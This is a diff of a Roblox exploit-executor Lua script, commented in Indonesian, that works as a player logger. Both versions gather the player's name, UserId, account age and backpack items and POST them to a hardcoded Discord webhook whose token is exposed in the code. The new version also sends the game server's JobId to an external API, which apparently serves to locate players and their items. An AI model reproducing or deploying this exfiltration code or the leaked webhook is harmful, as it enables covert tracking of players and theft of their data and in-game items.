@@ -1,158 +1,107 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
-local function sendToDiscord()
-    -- 1. Fungsi pembantu yang diperbarui
-    local function safeJSONEncode(data)
-        local success, result = pcall(function()
-            -- Konversi semua angka ke string untuk menghindari scientific notation
-            local function processTable(t)
-                local processed = {}
-                for k, v in pairs(t) do
-                    if type(v) == "number" and v >= 1e6 then
-                        processed[k] = tostring(v)
-                    elseif type(v) == "table" then
-                        processed[k] = processTable(v)
-                    else
-                        processed[k] = v
-                    end
-                end
-                return processed
-            end
-            
-            return HttpService:JSONEncode(processTable(data))
-        end)
-        return success and result or nil
-    end
+-- Konfigurasi
+local jobId = tostring(game.JobId)
+local apiEndpoint = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
+local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
+local player = Players.LocalPlayer
+local playerName = player.Name
 
-    -- 2. Persiapan data player
-    local player = Players.LocalPlayer
-    local playerData = {
-        Name = player.Name,
-        UserId = player.UserId,
-        AccountAge = player.AccountAge
-    }
+-- Ambil fungsi http request yang tersedia dari executor
+local httpRequest = (http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request))
 
-    -- 3. Koleksi item backpack dengan validasi ketat
-    local backpackItems = {}
-    local backpack = player:FindFirstChild("Backpack") or player:WaitForChild("Backpack", 5)
-    
-    if backpack then
-        for _, item in ipairs(backpack:GetChildren()) do
-            local itemInfo = {
-                Name = item.Name,
-                Weight = tonumber(item:GetAttribute("Weight")) or 0,
-                Age = tonumber(item:GetAttribute("Age")) or 1,
-                Value = tonumber(item:GetAttribute("Value")) or 0,
-                IsCelestial = item:GetAttribute("IsCelestial") or false
-            }
-            
-            -- Format output yang valid
-            table.insert(backpackItems, string.format(
-                "%s%s [%.2f KG] [Age %d] → %d#",
-                itemInfo.IsCelestial and "[Celestial] " or "",
-                itemInfo.Name,
-                itemInfo.Weight,
-                itemInfo.Age,
-                itemInfo.Value
-            ))
-        end
-    end
-
-    -- 4. Format payload sesuai spesifikasi Discord
-    local payload = {
-        username = "Backpack Logger",
-        avatar_url = "https://i.imgur.com/0y0F0Gj.png",
-        embeds = {{
-            title = "📦 Backpack Contents",
-            description = "```"..table.concat(backpackItems, "\n").."```",
-            color = 0x3498db,
-            fields = {
-                {
-                    name = "Player Info",
-                    value = string.format("Name: %s\nID: %d\nAccount Age: %d days",
-                        playerData.Name,
-                        playerData.UserId,
-                        playerData.AccountAge),
-                    inline = true
-                }
-            },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-
-    -- 5. Deteksi executor dan konfigurasi request
-    local requestFunc
-    local executors = {
-        syn = syn and syn.request,
-        fluxus = fluxus and fluxus.request,
-        krnl = krnl and krnl.request,
-        http = http_request or request
-    }
-
-    for name, func in pairs(executors) do
-        if type(func) == "function" then
-            print("Menggunakan executor:", name)
-            requestFunc = func
-            break
-        end
-    end
-
-    if not requestFunc then
-        warn("Tidak ada fungsi request yang tersedia")
-        return false
-    end
-
-    -- 6. Kirim request dengan validasi ekstra
-    local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-    
-    local jsonPayload = safeJSONEncode(payload)
-    if not jsonPayload then
-        warn("Gagal mengencode payload JSON")
-        return false
-    end
-
-    -- Debug: Tampilkan payload sebelum dikirim
-    print("Payload yang akan dikirim:")
-    print(string.sub(jsonPayload, 1, 1000)) -- Cetak sebagian untuk inspeksi
-
-    local success, response = pcall(function()
-        return requestFunc({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["Content-Length"] = tostring(#jsonPayload)
-            },
-            Body = jsonPayload
-        })
-    end)
-
-    -- 7. Penanganan response
-    if success and response then
-        print("Status Code:", response.StatusCode)
-        print("Response Body:", response.Body)
-        
-        if response.StatusCode == 204 or response.StatusCode == 200 then
-            print("✅ Webhook terkirim sukses!")
-            return true
-        else
-            warn("❌ Error dari Discord:", response.StatusCode, response.Body)
-            -- Coba parse error message dari Discord
-            local errorData = HttpService:JSONDecode(response.Body)
-            if errorData and errorData.message then
-                warn("Pesan error Discord:", errorData.message)
-            end
-        end
-    else
-        warn("Gagal mengirim request:", response)
-    end
-
-    return false
+if typeof(httpRequest) ~= "function" then
+    warn("❌ Executor tidak mendukung http request!")
+    return
 end
 
--- Jalankan fungsi utama
-local success = sendToDiscord()
-if not success then
-    warn("Gagal mengirim data ke Discord")
+-- Fungsi bantu untuk request dengan error handling
+local function safeRequest(requestTable)
+    local success, response = pcall(function()
+        return httpRequest(requestTable)
+    end)
+    if not success then
+        warn("❌ Error saat melakukan HTTP request:", response)
+        return nil
+    end
+    return response
+end
+
+-- Fungsi untuk mendapatkan isi backpack
+local function getBackpackContents()
+    local contents = {}
+    local backpack = player:FindFirstChild("Backpack")
+    if not backpack then return "Backpack tidak ditemukan" end
+    
+    for _, item in ipairs(backpack:GetChildren()) do
+        table.insert(contents, item.Name)
+    end
+    
+    if #contents == 0 then
+        return "Backpack kosong"
+    else
+        return table.concat(contents, ", ")
+    end
+end
+
+-- Kirim ke API
+local jsonData = HttpService:JSONEncode({ instanceId = jobId })
+local apiResponse = safeRequest({
+    Url = apiEndpoint,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = jsonData
+})
+
+if apiResponse and apiResponse.StatusCode == 200 then
+    print("✅ InstanceId berhasil dikirim ke API:", jobId)
+else
+    warn("❌ Gagal kirim ke API:", apiResponse and apiResponse.StatusCode or "Tidak ada respons")
+end
+
+-- Dapatkan isi backpack
+local backpackContents = getBackpackContents()
+
+-- Kirim ke Discord Webhook
+local embed = {
+    ["username"] = "Logger",
+    ["embeds"] = {{
+        ["title"] = "🟢 Script Dijalankan",
+        ["description"] = string.format("**%s** menjalankan script\n📡 **JobId:** `%s`", playerName, jobId),
+        ["color"] = 65280, -- Hijau
+        ["timestamp"] = DateTime.now():ToIsoDate(),
+        ["fields"] = {
+            {
+                ["name"] = "🎒 Isi Backpack",
+                ["value"] = backpackContents,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "👤 Info Player",
+                ["value"] = string.format("UserID: %d\nAccount Age: %d hari", player.UserId, player.AccountAge),
+                ["inline"] = true
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Logger System"
+        }
+    }}
+}
+
+local webhookResponse = safeRequest({
+    Url = webhookUrl,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(embed)
+})
+
+if webhookResponse and webhookResponse.StatusCode == 200 then
+    print("✅ Webhook Discord terkirim!")
+else
+    warn("❌ Gagal kirim webhook:", webhookResponse and webhookResponse.StatusCode or "Tidak ada respons")
 end
